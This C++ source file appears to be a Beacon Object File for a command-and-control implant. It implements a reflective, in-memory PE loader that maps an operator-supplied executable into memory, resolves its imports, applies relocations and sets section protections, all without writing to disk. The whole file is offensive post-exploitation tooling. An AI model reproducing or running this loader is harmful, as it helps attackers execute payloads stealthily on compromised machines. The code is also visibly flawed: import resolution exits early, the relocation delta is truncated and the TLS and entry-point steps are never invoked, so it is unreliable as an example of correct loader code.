#include <General.hpp>

auto Fix::Tls( PVOID Base, PVOID DataDir ) -> VOID {
    if ( static_cast<PIMAGE_DATA_DIRECTORY>( DataDir )->Size ) {
        PIMAGE_TLS_DIRECTORY TlsDir   = (PIMAGE_TLS_DIRECTORY)( (UPTR)( Base ) + static_cast<PIMAGE_DATA_DIRECTORY>( DataDir )->VirtualAddress );
        PIMAGE_TLS_CALLBACK* Callback = (PIMAGE_TLS_CALLBACK*)TlsDir->AddressOfCallBacks;

        if ( Callback ) {
            for ( INT i = 0; Callback[i] != nullptr; ++i ) {
                Callback[i]( Base, DLL_PROCESS_ATTACH, nullptr );
            }
        }
    }
}

auto Fix::Exp( PVOID Base, PVOID DataDir ) -> VOID {
    if ( static_cast<PIMAGE_DATA_DIRECTORY>( DataDir )->Size ) {
        PIMAGE_RUNTIME_FUNCTION_ENTRY FncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)( (UPTR)( Base ) + static_cast<PIMAGE_DATA_DIRECTORY>( DataDir )->VirtualAddress );

        RtlAddFunctionTable( (PRUNTIME_FUNCTION)FncEntry, static_cast<PIMAGE_DATA_DIRECTORY>( DataDir )->Size / sizeof( IMAGE_RUNTIME_FUNCTION_ENTRY ), (UPTR)( Base ) );
    }
}

auto Fix::Imp( PVOID Base, PVOID DataDir ) -> BOOL {
    PIMAGE_IMPORT_DESCRIPTOR ImpDesc = (PIMAGE_IMPORT_DESCRIPTOR)( (UPTR)( Base ) + static_cast<IMAGE_DATA_DIRECTORY*>( DataDir )->VirtualAddress );

    for ( ; ImpDesc->Name; ImpDesc++ ) {

		PIMAGE_THUNK_DATA FirstThunk  = (PIMAGE_THUNK_DATA)( (UPTR)( Base ) + ImpDesc->FirstThunk );
		PIMAGE_THUNK_DATA OriginThunk = (PIMAGE_THUNK_DATA)( (UPTR)( Base ) + ImpDesc->OriginalFirstThunk );

		PCHAR  DllName = (CHAR*)( (UPTR)( Base ) + ImpDesc->Name );
        PVOID  DllBase = (PVOID)( GetModuleHandleA( DllName ) );

        PVOID  FunctionPtr = 0;
        STRING AnsiString  = { 0 };

        if ( !DllBase ) {
            DllBase = (PVOID)LoadLibraryA( DllName );
        }

		if ( !DllBase ) {
            return FALSE;
		}

		for ( ; OriginThunk->u1.Function; FirstThunk++, OriginThunk++ ) {

			if ( IMAGE_SNAP_BY_ORDINAL( OriginThunk->u1.Ordinal ) ) {

                LdrGetProcedureAddress( 
                    (HMODULE)DllBase, NULL, IMAGE_ORDINAL( OriginThunk->u1.Ordinal ), &FunctionPtr
                );

                FirstThunk->u1.Function = (UPTR)( FunctionPtr );
				if ( !FirstThunk->u1.Function ) return FALSE;

			} else {
				PIMAGE_IMPORT_BY_NAME Hint = (PIMAGE_IMPORT_BY_NAME)( (UPTR)( Base ) + OriginThunk->u1.AddressOfData );

                for ( INT i = 0; i < sizeof( IAT::Table ); i++ ) {
                    if ( Str::CompareA( IAT::Table[i].Name, Hint->Name ) ) {
                        FunctionPtr = IAT::Table[i].Ptr;
                        FirstThunk->u1.Function = (UPTR)( FunctionPtr );
                        if ( !FirstThunk->u1.Function ) return FALSE;
                        return TRUE;
                    }
                }

                {
                    AnsiString.Length        = Str::LengthA( Hint->Name );
                    AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
                    AnsiString.Buffer        = Hint->Name;
                }
                
				LdrGetProcedureAddress( 
                    (HMODULE)DllBase, &AnsiString, 0, &FunctionPtr 
                );
                FirstThunk->u1.Function = (UPTR)( FunctionPtr );

				if ( !FirstThunk->u1.Function ) return FALSE;
			}
		}
	}
	
	return TRUE;
}

auto Fix::Rel( PVOID Base, UPTR Delta, PVOID DataDir ) -> VOID {
    PIMAGE_BASE_RELOCATION BaseReloc = (PIMAGE_BASE_RELOCATION)( (UPTR)( Base ) + static_cast<PIMAGE_DATA_DIRECTORY>( DataDir )->VirtualAddress );
    PIMAGE_RELOC           RelocInf  = { 0 };
    UPTR              RelocPtr  = NULL;

    while ( BaseReloc->VirtualAddress ) {
        
        RelocInf = (PIMAGE_RELOC)( BaseReloc + 1 ); 
        RelocPtr = ( (UPTR)( Base ) + BaseReloc->VirtualAddress );

        while ( (BYTE*)( RelocInf ) != (BYTE*)( BaseReloc ) + BaseReloc->SizeOfBlock ) {
            switch ( RelocInf->Type ) {
            case IMAGE_REL_TYPE:
                *(UPTR*)( RelocPtr + RelocInf->Offset ) += (UPTR)( Delta ); break;
            case IMAGE_REL_BASED_HIGHLOW:
                *(ULONG*)( RelocPtr + RelocInf->Offset ) += (DWORD)( Delta ); break;
            case IMAGE_REL_BASED_HIGH:
                *(WORD*)( RelocPtr + RelocInf->Offset ) += HIWORD( Delta ); break;
            case IMAGE_REL_BASED_LOW:
                *(WORD*)( RelocPtr + RelocInf->Offset ) += LOWORD( Delta ); break;
            default:
                break;
            }

            RelocInf++;
        }

        BaseReloc = (PIMAGE_BASE_RELOCATION)RelocInf;
    };

    return;
}


EXTERN_C
auto go( CHAR* Args, INT32 Argc ) -> VOID {
    Data Parser = { 0 };

    BeaconDataParse( &Parser, Args, Argc );

    INT32 Length    = 0;
    BYTE* Buffer    = (BYTE*)BeaconDataExtract( &Parser, &Length );
    INT32 ArgLen    = 0;
    BYTE* Arguments = (BYTE*)BeaconDataExtract( &Parser, &ArgLen );

    ULONG* Reads     = { 0 };
    BOOL   IsDLL     = FALSE;
    HWND   WinHandle = NULL;
    HANDLE BackupOut = INVALID_HANDLE_VALUE;
    HANDLE PipeRead  = INVALID_HANDLE_VALUE;
    HANDLE PipeWrite = INVALID_HANDLE_VALUE;

    ULONG Delta   = 0;
    ULONG ImgSize = 0;
    PVOID ImgBase = nullptr;

    SECURITY_ATTRIBUTES SecAttr = { 0 };

    IMAGE_NT_HEADERS*     Header = { 0 };
    IMAGE_SECTION_HEADER* SecHdr = { 0 };
    IMAGE_DATA_DIRECTORY* RelDir = { 0 };
    IMAGE_DATA_DIRECTORY* ExpDir = { 0 };
    IMAGE_DATA_DIRECTORY* TlsDir = { 0 };
    IMAGE_DATA_DIRECTORY* ImpDir = { 0 };

    Header = (IMAGE_NT_HEADERS*)( U_PTR( Buffer ) + ( (PIMAGE_DOS_HEADER)( Buffer ) )->e_lfanew );
    SecHdr = IMAGE_FIRST_SECTION( Header );
    RelDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    ExpDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    TlsDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    ImpDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    ImgSize = Header->OptionalHeader.SizeOfImage;
    IsDLL   = Header->FileHeader.Characteristics & IMAGE_FILE_DLL;

    ImgBase = VirtualAlloc( nullptr, ImgSize, MEM_COMMIT, PAGE_READWRITE );
    if ( ! ImgBase ) {
        return;
    }

    Delta = ( U_PTR( ImgBase ) - Header->OptionalHeader.ImageBase );

    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        Mem::Copy<PVOID>(
            PTR( U_PTR( ImgBase ) + SecHdr[i].VirtualAddress ),
            PTR( U_PTR( Buffer )  + SecHdr[i].PointerToRawData ),
            SecHdr[i].SizeOfRawData
        );
    }

    Fix::Imp( ImgBase, ImpDir );
    Fix::Rel( ImgBase, Delta, RelDir );
    Fix::Exp( ImgBase, ExpDir );

    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        PVOID    SectionPtr       = ( ImgBase + SecHdr[i].VirtualAddress );
        SIZE_T   SectionSize      = SecHdr[i].SizeOfRawData;
        ULONG    MemoryProtection = 0;
        ULONG    OldProtection    = 0;
		
		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE )
			MemoryProtection = PAGE_WRITECOPY;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ )
			MemoryProtection = PAGE_READONLY;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			MemoryProtection = PAGE_READWRITE;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE )
			MemoryProtection = PAGE_EXECUTE;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
			MemoryProtection = PAGE_EXECUTE_WRITECOPY;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			MemoryProtection = PAGE_EXECUTE_READ;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			MemoryProtection = PAGE_EXECUTE_READWRITE;

        if ( ! ( VirtualProtect( SectionPtr, SectionSize, MemoryProtection, &OldProtection ) ) ) { return; }
    }

    
}